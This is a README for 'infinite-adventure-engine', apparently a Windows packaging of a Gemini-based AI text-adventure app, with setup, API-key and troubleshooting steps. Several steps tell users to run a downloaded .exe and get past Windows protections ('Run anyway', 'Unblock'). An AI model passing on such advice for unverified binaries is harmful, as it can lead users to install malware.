# 🎮 infinite-adventure-engine - Run your AI adventure app

[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Harto1622/infinite-adventure-engine/releases)

## 🧭 What this app does

infinite-adventure-engine is a desktop app for running an AI Studio adventure game on your Windows PC. It lets you start the app, enter your Gemini API key, and play through an interactive story with AI-driven scenes.

Use it if you want to:
- run the app on your own computer
- load your story setup in one place
- play a text-based adventure with AI responses
- keep the app on your PC for quick access

## 💾 Download the app

Visit this page to download the latest Windows release:

[Download infinite-adventure-engine from GitHub Releases](https://github.com/Harto1622/infinite-adventure-engine/releases)

On the releases page, look for the latest version. Download the Windows file that matches your PC. If you see a ZIP file, save it to your computer and open it after the download finishes.

## 🪟 Windows setup

Follow these steps on Windows:

1. Open the release page and download the latest version.
2. If the file is a ZIP, right-click it and choose **Extract All**.
3. Open the extracted folder.
4. Find the app file, such as an `.exe` file.
5. Double-click the file to start the app.

If Windows asks for permission, choose **Yes** or **Run anyway** if you trust the file and downloaded it from the release page.

## 🔑 Add your Gemini API key

The app needs your Gemini API key before it can run.

1. Open the app folder.
2. Look for a file named `.env.local`.
3. Open the file in Notepad.
4. Add your key in this format:

   `GEMINI_API_KEY=your_api_key_here`

5. Save the file.
6. Close Notepad and start the app again.

If you do not have a Gemini API key yet, create one in your Google AI Studio account, then copy it into the file.

## 🖥️ Start the app

After you add the API key:

1. Open the app again.
2. Wait for it to load.
3. Enter any setup details the app asks for.
4. Start your adventure.

If the app opens in a browser window, leave that window open while you use it.

## 📦 What you need on your PC

You do not need much to run this app, but your computer should have:

- Windows 10 or Windows 11
- Enough free space for the app files
- An internet connection for AI features
- A valid Gemini API key

For best results, use a recent Windows PC with stable internet.

## 🧰 If you want to run from source

If you are using the app files from the source project instead of a release, you need Node.js.

1. Install Node.js on your PC.
2. Open the project folder.
3. Install dependencies with:

   `npm install`

4. Add your Gemini API key to `.env.local`:

   `GEMINI_API_KEY=your_api_key_here`

5. Start the app with:

   `npm run dev`

This mode is for users who want to run the app from the project files.

## 🎮 How to use the app

After the app starts, you can usually:

- begin a new adventure
- read story text on screen
- choose from available options
- enter your own actions or responses
- continue the story one step at a time

Keep your API key in place so the app can talk to Gemini when it needs story output.

## 🛠️ Common problems

### The app does not start
- Check that you downloaded the latest release
- Make sure you opened the right file
- Try extracting the ZIP file again

### Windows blocks the file
- Right-click the app file
- Select **Properties**
- If you see **Unblock**, select it
- Click **Apply**
- Try opening the app again

### The app says the API key is missing
- Open `.env.local`
- Check that the line uses this format:

  `GEMINI_API_KEY=your_api_key_here`

- Make sure there are no spaces before or after the key

### The app opens, but nothing loads
- Check your internet connection
- Confirm your Gemini API key is valid
- Close the app and open it again

## 📁 Basic file layout

After you extract the download, you may see files like these:

- an app file to open
- a `.env.local` file for your API key
- folders with app data
- support files used by the app

Do not rename files unless the app instructions ask you to do so.

## 🔗 Links

- GitHub Releases: https://github.com/Harto1622/infinite-adventure-engine/releases
- AI Studio app page: https://ai.studio/apps/drive/16Y8jXMvuzAEsFU601u6idxqozSA82Tjg